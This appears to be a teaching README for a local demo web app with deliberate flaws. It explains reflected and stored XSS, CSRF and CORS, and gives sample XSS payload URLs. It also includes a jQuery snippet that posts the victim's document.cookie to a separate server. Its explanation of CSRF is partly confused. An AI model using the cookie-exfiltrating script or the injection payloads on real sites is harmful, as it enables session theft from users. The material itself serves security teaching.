# Vulnerabilities in WebApplications: XSS


## Environment setup

1. `sudo apt-get install libffi-dev`
2. `sudo apt-get install virtualenv`
3. `virtualenv -p python3 venv`
4. `source venv/bin/activate`
5. `pip install -U setuptools && pip install -U pip`
6. `cd xss-demo/app`
7. `pip install -r dev_requirements.txt`
8.  `python setup.py develop`
9.  **Start the application:**  `pserve development.ini`
10. Access it on [http://localhost:6543](http://localhost:6543/ "http://localhost:6543/")


## Types  of  Cross-site  Scripting

![Server-XSS vs Client-XSS Chart.jpg](https://www.owasp.org/images/c/c6/Server-XSS_vs_Client-XSS_Chart.jpg)

## Reflected  XSS  Attack

In a Reflected XSS it is assumed that the attack is non-persistent.

With this attack it becomes possible to manipulate the browser Domain ObjectModel (DOM) for a single user, or for multiple users which access a page through the same specially crafted URL.

**Examples:**

 - Launch na alert to the user:  `http://localhost:6543/search?q=<script>alert("hi")</script>`
 - Redirect the user to another page: `http://localhost:6543/search?q=<script>window.open("https://www.google.pt")</script>`
​

## Stored  XSS  Attack

The Stored XSS Attack (or persistent) allows an attacker to place a maliciousscript (usually Javascript) into a webpage.

Victims accessingthe webpage will render all scripts, including the one injected by the attacker.

This attack is very common in place where information is shared betweenusers through web technologies (e.g., forums and blogs).

At the example of the class, we add a comments section where the body input is not protected, I will present some possible examples of this attack:

 - Loads an image to the comment: `<img src=‘img.png’></img>`
 - Launch na alert to the user:  `<script>alert("hello!")</script>`


## CSRF  Attack

The Cross-Site Request Forgery (CSRF) attack consists in injecting code that, using the credentials and capabilities of the browser viewing a given object, may attack another system.

This attack can be used for simple Denial-of-Service (DoS) or Distributed Denial-of-Service (DDoS), tracking users, or invoke requests on systems with the identity of the victim.

This exploits the fact that, for usability, functionality, and performance pur-poses, systems cache authentication credentials in small tokens named **cookies**.

This attack is frequently done using the `<img>` tag, however, other tags canbe used.
```
$.ajax({
    url: "http://localhost:8000/cookie",
    type: "POST",
    data: {
        username:"Joao",
        // we add the 'a' to blind init the cookie when the browser does not have the cookie's value stored
        cookie: "a" + document.cookie,
    }
});
```


## Cross-Origin Resource Sharing (CORS)

Cross-Origin Resource Sharing (CORS) is a mechanism that uses additional HTTP headers to tell a browser to let a web application running at one origin (domain) have permission to access selected resources from a server at a different origin.

A web application executes a cross-origin HTTP request when it requests a resource that has a different origin (domain, protocol, and port) than its own origin.
```  
<script>  
    $.ajax({  
        url: "http://external:8000/smile.jpg",  
        type: "GET",
        headers: {
            "Image-Request": "this image will pass",
        },
        success: function() {
            alert("smile.jpg loaded");
        },
    });
</script>
```
